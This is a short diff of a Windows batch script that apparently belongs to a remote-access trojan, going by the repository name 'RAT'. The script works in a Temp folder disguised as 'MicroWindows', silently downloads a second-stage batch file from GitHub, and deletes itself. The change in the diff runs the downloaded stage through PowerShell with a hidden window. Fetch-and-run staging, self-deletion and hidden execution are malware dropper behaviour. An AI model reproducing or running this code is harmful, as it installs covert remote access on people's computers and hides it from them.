@@ -30,4 +30,4 @@ cd C:\Users\saif\AppData\Local\Temp\MicroWindows
 mkdir Logs
 curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o secondary.bat --silent
 del "%~f0"
-start "" secondary.bat
+powershell -windowstyle hidden secondary.bat
